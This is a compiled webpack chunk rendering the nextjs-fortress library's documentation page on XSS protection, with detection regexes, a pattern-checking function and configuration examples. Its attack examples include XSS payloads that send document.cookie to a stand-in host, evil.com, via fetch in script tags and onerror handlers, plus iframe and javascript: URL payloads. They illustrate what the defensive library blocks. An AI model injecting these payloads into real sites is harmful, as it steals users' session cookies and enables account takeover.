"use strict";(globalThis.webpackChunkdocs=globalThis.webpackChunkdocs||[]).push([[649],{7407(e,n,t){t.r(n),t.d(n,{assets:()=>a,contentTitle:()=>o,default:()=>h,frontMatter:()=>c,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"modules/injection/xss-protection","title":"XSS Protection (Cross-Site Scripting)","description":"Overview","source":"@site/docs/modules/injection/xss-protection.md","sourceDirName":"modules/injection","slug":"/modules/injection/xss-protection","permalink":"/nextjs-fortress/docs/modules/injection/xss-protection","draft":false,"unlisted":false,"editUrl":"https://github.com/mindfiredigital/nextjs-fortress/tree/main/docs/docs/modules/injection/xss-protection.md","tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Command Injection Protection","permalink":"/nextjs-fortress/docs/modules/injection/command-injection"},"next":{"title":"code-injection","permalink":"/nextjs-fortress/docs/modules/injection/code-injection"}}');var s=t(4848),r=t(8453);const c={},o="XSS Protection (Cross-Site Scripting)",a={},l=[{value:"Overview",id:"overview",level:2},{value:"Why This Is Important",id:"why-this-is-important",level:2},{value:"The Problem: Cross-Site Scripting Attacks",id:"the-problem-cross-site-scripting-attacks",level:3},{value:"1. <strong>Script Tag Injection</strong>",id:"1-script-tag-injection",level:4},{value:"2. <strong>Event Handler Injection</strong>",id:"2-event-handler-injection",level:4},{value:"3. <strong>JavaScript Protocol</strong>",id:"3-javascript-protocol",level:4},{value:"4. <strong>iFrame Injection</strong>",id:"4-iframe-injection",level:4},{value:"How nextjs-fortress Solves This",id:"how-nextjs-fortress-solves-this",level:2},{value:"Detection Patterns",id:"detection-patterns",level:3},{value:"The Algorithm",id:"the-algorithm",level:3},{value:"Configuration",id:"configuration",level:2},{value:"Basic Setup",id:"basic-setup",level:3},{value:"With Custom Patterns",id:"with-custom-patterns",level:3},{value:"Attack Examples",id:"attack-examples",level:2},{value:"Example 1: Cookie Theft",id:"example-1-cookie-theft",level:3},{value:"Example 2: Event Handler Attack",id:"example-2-event-handler-attack",level:3},{value:"Example 3: JavaScript URL",id:"example-3-javascript-url",level:3},{value:"Example 4: iFrame Embedding",id:"example-4-iframe-embedding",level:3},{value:"How to Initialize",id:"how-to-initialize",level:2},{value:"Summary",id:"summary",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"xss-protection-cross-site-scripting",children:"XSS Protection (Cross-Site Scripting)"})}),"\n",(0,s.jsx)(n.h2,{id:"overview",children:"Overview"}),"\n",(0,s.jsx)(n.p,{children:"XSS protection detects and blocks malicious JavaScript code in payloads that could be executed in users' browsers to steal data, hijack sessions, or deface applications."}),"\n",(0,s.jsx)(n.h2,{id:"why-this-is-important",children:"Why This Is Important"}),"\n",(0,s.jsx)(n.h3,{id:"the-problem-cross-site-scripting-attacks",children:"The Problem: Cross-Site Scripting Attacks"}),"\n",(0,s.jsx)(n.p,{children:"Attackers inject malicious scripts that execute in victims' browsers:"}),"\n",(0,s.jsxs)(n.h4,{id:"1-script-tag-injection",children:["1. ",(0,s.jsx)(n.strong,{children:"Script Tag Injection"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Attacker comment on blog\n{\n  "comment": "<script>alert(document.cookie)<\/script>"\n}\n\n// Without protection:\n// Comment stored in database\n// When page loads: <div>{comment}</div>\n// Script executes: alert(document.cookie)\n// Attacker steals session cookies\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What Happens Without Protection:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Malicious script stored"}),"\n",(0,s.jsx)(n.li,{children:"Executes in all users' browsers"}),"\n",(0,s.jsx)(n.li,{children:"Session cookies stolen"}),"\n",(0,s.jsx)(n.li,{children:"Users' accounts compromised"}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Impact:"})," Session hijacking Account takeover Data theft Identity impersonation"]}),"\n",(0,s.jsxs)(n.h4,{id:"2-event-handler-injection",children:["2. ",(0,s.jsx)(n.strong,{children:"Event Handler Injection"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Attacker profile update\n{\n  "avatar": "<img src=x onerror=\'fetch(\\"https://evil.com?cookie=\\"+document.cookie)\'>"\n}\n\n// Without protection:\n// Renders: <img src=x onerror=\'...\'>\n// Browser triggers onerror\n// Sends cookies to attacker\'s server\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What Happens Without Protection:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Event handlers execute JavaScript"}),"\n",(0,s.jsx)(n.li,{children:"Data exfiltrated silently"}),"\n",(0,s.jsx)(n.li,{children:"User unaware of attack"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Impact:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Silent data theft"}),"\n",(0,s.jsx)(n.li,{children:"Stealth attacks"}),"\n",(0,s.jsx)(n.li,{children:"Data exfiltration"}),"\n",(0,s.jsx)(n.li,{children:"Targeted attacks"}),"\n"]}),"\n",(0,s.jsxs)(n.h4,{id:"3-javascript-protocol",children:["3. ",(0,s.jsx)(n.strong,{children:"JavaScript Protocol"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Attacker malicious link\n{\n  "website": "javascript:void(window.location=\'https://evil.com?cookie=\'+document.cookie)"\n}\n\n// Without protection:\n// Renders: <a href="javascript:...">Click here</a>\n// User clicks link\n// JavaScript executes\n// Redirected with stolen cookies\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What Happens Without Protection:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Links execute JavaScript"}),"\n",(0,s.jsx)(n.li,{children:"Victims tricked into clicking"}),"\n",(0,s.jsx)(n.li,{children:"Credentials stolen"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Impact:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Phishing attacks"}),"\n",(0,s.jsx)(n.li,{children:"Malicious redirects"}),"\n",(0,s.jsx)(n.li,{children:"Cookie theft"}),"\n",(0,s.jsx)(n.li,{children:"Credential harvesting"}),"\n"]}),"\n",(0,s.jsxs)(n.h4,{id:"4-iframe-injection",children:["4. ",(0,s.jsx)(n.strong,{children:"iFrame Injection"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Attacker embeds malicious iframe\n{\n  "content": "<iframe src=\'https://evil.com/keylogger\'></iframe>"\n}\n\n// Without protection:\n// Iframe loads malicious page\n// Keylogger captures all input\n// Sends to attacker\'s server\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What Happens Without Protection:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Malicious content embedded"}),"\n",(0,s.jsx)(n.li,{children:"Keyloggers capture input"}),"\n",(0,s.jsx)(n.li,{children:"All user actions monitored"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Impact:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Keystroke logging"}),"\n",(0,s.jsx)(n.li,{children:"Password capture"}),"\n",(0,s.jsx)(n.li,{children:"Form data theft"}),"\n",(0,s.jsx)(n.li,{children:"Persistent monitoring"}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"how-nextjs-fortress-solves-this",children:"How nextjs-fortress Solves This"}),"\n",(0,s.jsx)(n.h3,{id:"detection-patterns",children:"Detection Patterns"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"export const XSS_PATTERNS = [\n  /<script[^>]*>.*<\\/script>/gi,           // Script tags\n  /on\\w+\\s*=\\s*[\"']?[^\"']*[\"']?/gi,        // Event handlers (onclick, onerror, etc.)\n  /javascript:/gi,                          // JavaScript protocol\n  /<iframe[^>]*>/gi,                        // iFrames\n  /<object[^>]*>/gi,                        // Object tags\n  /<embed[^>]*>/gi,                         // Embed tags\n  /<img[^>]*onerror/gi,                     // Image onerror\n  /eval\\s*\\(/gi,                            // eval() calls\n  /expression\\s*\\(/gi,                      // CSS expression\n  /vbscript:/gi,                            // VBScript protocol\n  /data:text\\/html/gi,                      // Data URIs with HTML\n];\n"})}),"\n",(0,s.jsx)(n.h3,{id:"the-algorithm",children:"The Algorithm"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"/**\n * Check a string against XSS patterns\n */\nprivate checkPatterns(\n  str: string,\n  patterns: RegExp[],\n  type: string\n): ValidationResult {\n  for (const pattern of patterns) {\n    pattern.lastIndex = 0; // Reset regex state\n    const match = pattern.exec(str);\n\n    if (match) {\n      return {\n        valid: false,\n        severity: 'high',\n        message: `XSS injection detected: \"${match[0]}\"`,\n        rule: 'xss_injection',\n        pattern: match[0],\n        confidence: 0.9,\n      };\n    }\n  }\n\n  return { valid: true };\n}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"configuration",children:"Configuration"}),"\n",(0,s.jsx)(n.h3,{id:"basic-setup",children:"Basic Setup"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"import { FortressConfig } from 'nextjs-fortress';\n\nexport const fortressConfig: FortressConfig = {\n  modules: {\n    injection: {\n      enabled: true,\n      checks: ['xss'], // Enable XSS detection\n    },\n  },\n};\n"})}),"\n",(0,s.jsx)(n.h3,{id:"with-custom-patterns",children:"With Custom Patterns"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"export const fortressConfig: FortressConfig = {\n  modules: {\n    injection: {\n      enabled: true,\n      checks: ['xss'],\n      customPatterns: [\n        /<style.*>.*<\\/style>/gi,        // Style injection\n        /expression\\(/gi,                 // CSS expressions\n        /<link[^>]*>/gi,                  // Link tags\n        /<base[^>]*>/gi,                  // Base tag hijacking\n      ],\n    },\n  },\n};\n"})}),"\n",(0,s.jsx)(n.h2,{id:"attack-examples",children:"Attack Examples"}),"\n",(0,s.jsx)(n.h3,{id:"example-1-cookie-theft",children:"Example 1: Cookie Theft"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Attacker comment\nPOST /api/comments\n{\n  "text": "<script>fetch(\'https://evil.com?c=\'+document.cookie)<\/script>"\n}\n\n// Fortress detects:\n// Pattern match: "<script>" found\n// Severity: high\n// Result: BLOCKED \u2705\n'})}),"\n",(0,s.jsx)(n.h3,{id:"example-2-event-handler-attack",children:"Example 2: Event Handler Attack"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Attacker profile picture\nPOST /api/user/avatar\n{\n  "url": "<img src=x onerror=alert(\'XSS\')>"\n}\n\n// Fortress detects:\n// Pattern match: "onerror=" found\n// Result: BLOCKED \u2705\n'})}),"\n",(0,s.jsx)(n.h3,{id:"example-3-javascript-url",children:"Example 3: JavaScript URL"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Attacker malicious link\nPOST /api/post\n{\n  "link": "javascript:alert(document.cookie)"\n}\n\n// Fortress detects:\n// Pattern match: "javascript:" found\n// Result: BLOCKED \u2705\n'})}),"\n",(0,s.jsx)(n.h3,{id:"example-4-iframe-embedding",children:"Example 4: iFrame Embedding"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Attacker embed malicious site\nPOST /api/content\n{\n  "html": "<iframe src=\'https://evil.com/phishing\'></iframe>"\n}\n\n// Fortress detects:\n// Pattern match: "<iframe" found\n// Result: BLOCKED \u2705\n'})}),"\n",(0,s.jsx)(n.h2,{id:"how-to-initialize",children:"How to Initialize"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"import { FortressConfig, FortressLogger } from 'nextjs-fortress';\n\nexport const fortressConfig: FortressConfig = {\n  enabled: true,\n  mode: 'development',\n\n  modules: {\n    injection: {\n      enabled: true,\n      checks: ['xss'],\n    },\n  },\n\n  onSecurityEvent: async (event) => {\n    if (event.detection.rule === 'xss_injection') {\n      const logger = new FortressLogger({\n        enabled: true,\n        level: 'warn',\n        destination: 'console',\n      });\n\n      logger.warn('\ud83d\udea8 XSS Attack Blocked', {\n        pattern: event.detection.pattern,\n        ip: event.request.ip,\n        path: event.request.path,\n      });\n    }\n  },\n};\n"})}),"\n",(0,s.jsx)(n.h2,{id:"summary",children:"Summary"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What happens without XSS protection:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Session hijacking"}),"\n",(0,s.jsx)(n.li,{children:"Cookie theft"}),"\n",(0,s.jsx)(n.li,{children:"Account takeover"}),"\n",(0,s.jsx)(n.li,{children:"Data exfiltration"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What nextjs-fortress provides:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Script tag detection"}),"\n",(0,s.jsx)(n.li,{children:"Event handler blocking"}),"\n",(0,s.jsx)(n.li,{children:"Protocol validation"}),"\n",(0,s.jsx)(n.li,{children:"iFrame prevention"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"How to initialize:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"injection: {\n  enabled: true,\n  checks: ['xss'],\n}\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Related Documentation:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"/nextjs-fortress/docs/modules/injection/sql-injection",children:"SQL Injection Protection"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"/nextjs-fortress/docs/modules/injection/command-injection",children:"Command Injection Protection"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"/nextjs-fortress/docs/modules/injection/code-injection",children:"Code Injection Protection"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},8453(e,n,t){t.d(n,{R:()=>c,x:()=>o});var i=t(6540);const s={},r=i.createContext(s);function c(e){const n=i.useContext(r);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);